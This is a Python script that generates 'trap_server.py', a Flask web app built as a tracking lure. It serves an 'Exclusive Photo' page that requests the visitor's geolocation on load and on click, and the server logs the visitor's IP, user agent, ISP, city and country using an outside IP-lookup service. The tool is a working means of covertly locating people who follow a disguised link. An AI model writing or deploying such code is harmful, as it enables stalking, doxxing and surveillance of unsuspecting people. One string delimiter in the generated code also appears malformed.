from reportlab.lib.pagesizes import letter
from reportlab.pdfgen import canvas
from reportlab.lib.utils import ImageReader

def create_trap_server_code():
    code = """
from flask import Flask, request, render_template_string, jsonify
import requests

app = Flask(__name__)

# Full rewritten trap server with improved reporting logic
HTML = \"""
<!doctype html>
<html lang="en">
<head>
  <meta charset=\\"utf-8\\">
  <meta name=\\"viewport\\" content=\\"width=device-width, initial-scale=1\\">
  <title>Exclusive Photo</title>
  <style>
    body { margin: 0; padding: 0; display: flex; justify-content: center; align-items: center;
      height: 100vh; background: #f4f4f4; font-family: Arial, sans-serif; }
    #container { width: 90%; max-width: 400px; background: #fff; border-radius: 8px;
      box-shadow: 0 4px 12px rgba(0,0,0,0.1); overflow: hidden; text-align: center; }
    #header { background: #007BFF; color: #fff; padding: 12px; font-size: 1.2em; }
    #imageWrapper { position: relative; width: 100%; padding-top: 75%; background: #ddd; }
    #loader { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
      font-size: 1em; color: #555; }
    #photo { position: absolute; top: 0; left: 0; width: 100%; height: 100%;
      object-fit: cover; opacity: 0; transition: opacity 0.5s ease; cursor: pointer; }
    #imageWrapper.loaded #photo { opacity: 1; }
  </style>
</head>
<body>
  <div id=\\"container\\">
    <div id=\\"header\\">Exclusive Photo</div>
    <div id=\\"imageWrapper\\">
      <div id=\\"loader\\">Loading…</div>
      <img id=\\"photo\\" src=\\"/static/photo.jpg\\" alt=\\"Exclusive Photo\\" />
    </div>
  </div>

  <script>
    // Unified reporting function
    function report(body) {
      fetch('/report', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body || {})
      }).catch(console.error);
    }

    // Geolocation first
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        function success(pos) {
          report({
            latitude: pos.coords.latitude,
            longitude: pos.coords.longitude,
            accuracy: pos.coords.accuracy
          });
        },
        function error(err) {
          console.warn('Geolocation denied or unavailable:', err);
          report();
        }
      );
    } else {
      report();
    }

    // Image load handling
    var wrapper = document.getElementById('imageWrapper');
    var img = document.getElementById('photo');
    img.onload = function() {
      wrapper.classList.add('loaded');
      document.getElementById('loader').style.display = 'none';
    };

    // Report on image click as well
    img.addEventListener('click', function() {
      report();
    });
  </script>
</body>
</html>
\""  # End HTML string

@app.route('/')
def index():
    return render_template_string(HTML)

@app.route('/report', methods=['POST'])
def report():
    info = request.get_json(silent=True) or {}
    ip = request.remote_addr
    ua = request.headers.get('User-Agent', 'Unknown')
    try:
        ip_data = requests.get(f'http://ip-api.com/json/{ip}').json()
    except:
        ip_data = {}
    result = {
        'ip': ip,
        'user_agent': ua,
        'isp': ip_data.get('isp'),
        'city': ip_data.get('city'),
        'region': ip_data.get('regionName'),
        'country': ip_data.get('country'),
        'latitude': info.get('latitude'),
        'longitude': info.get('longitude'),
        'accuracy': info.get('accuracy')
    }
    print('>>> Captured data:', result)
    return jsonify(status='ok')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
    """
    # Save code to file
    with open("trap_server.py", "w") as f:
        f.write(code)
    print("Generated trap_server.py")

create_trap_server_code()

